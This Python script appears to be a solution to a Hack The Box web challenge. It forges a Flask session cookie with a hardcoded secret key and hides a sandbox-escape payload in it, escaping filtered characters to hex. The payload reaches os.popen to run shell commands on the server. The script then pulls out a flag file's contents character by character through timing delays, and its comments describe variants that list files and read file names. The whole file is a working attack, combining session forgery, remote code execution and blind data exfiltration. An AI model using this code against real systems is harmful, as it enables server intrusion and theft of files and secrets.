import hashlib
import itsdangerous
from flask.json.tag import TaggedJSONSerializer
import requests
import re
import time

# Useful link for this challenge
# https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce


# Just convert forbidden chars in a string to hex-value
def convert2Hex(string):
	# ord() convert return integer representation of unicode char
	# ":02x" is used in a formatted string and specifies number of chars displayed and the conversion (hex in this case)
	new_str = ""
	regex = re.compile('|'.join(map(re.escape, ['[', '(', '_', '.'])))

	for char in string:
		if regex.match(char):
			new_str += rf"\x{ord(char):02x}"
		else:
			new_str += char
    
	return new_str


# Send a request with given params and return the response
def send_request(ingredient, measurements):
    # Convert them into hexadeciaml escaped characters
    measurements = convert2Hex(measurements)

    # Create your session payload and use the secret key obtained
    session = {"ingredient": ingredient, "measurements": measurements}
    secret = 'eA2b8A2eA1EADa7b2eCbea7e3dAd1e'

    # Generate the cookie
    generated_cookie = itsdangerous.url_safe.URLSafeTimedSerializer(
        secret_key=secret,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer=itsdangerous.TimestampSigner,
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }).dumps(session)   # Here print the whole signature with the given session

    # Make the request as always
    response = requests.get(url, cookies={"session":generated_cookie})
    
    return response


# URL for the request   (port is separated for ease the changes)
url = "http://docker.hackthebox.eu:%s" % "30137"

# Get some inputs for payload
characters = ['{', '_', '}', '!', '?', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
              '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
              'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']      # remove special chars and numbers to ease the search of files

index_file = 1
flag_name = ""
#file_name = ""

for index_char in range(51):        # 50 is a guessed number, not sure is the right length
    found = False
    for char in characters:
        ingredient = "b"        # filler
        measurements = \
'''1\n
exec "i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']\\nif i('os').popen('ls|grep to|xargs cat').read()[''' + str(index_char) + ''']==\'''' + char + '''\':\\n\ti('time').sleep(2)"'''


        # if i('os').listdir(path).__len__()==length:\\n\ti('time').sleep(2)      # To retrieve number of files
        # if i('os').listdir(path)[file_index][char_index]=='char':\\n\ti('time').sleep(2)      # To retrieve a char from file name
        # if i('os').popen('ls|grep to|xargs cat').read()   # 'ls' to list files, 'grep to' to retrieve files with given string 'to', 'xargs cat' to display content of retrieved files

        # File name found 'totally_not_a_loooooooong_flaaaaag'
        
        response = send_request(ingredient, measurements)
        
        #print("file n°" + str(index_file) + " - char °" + str(index_char) + " checked: " + char)
        
        print("char °" + str(index_char) + " checked: " + char)

        if int(response.elapsed.total_seconds()) == 2:
            #print("file n°" + str(index_file) + " - char found: " + char)
            #file_name += char
            #print("File name: " + file_name, end="\n\n")
            
            print("file n°" + str(index_file) + " - char found: " + char)
            flag_name += char
            print("Flag: " + flag_name, end="\n\n")
            break
    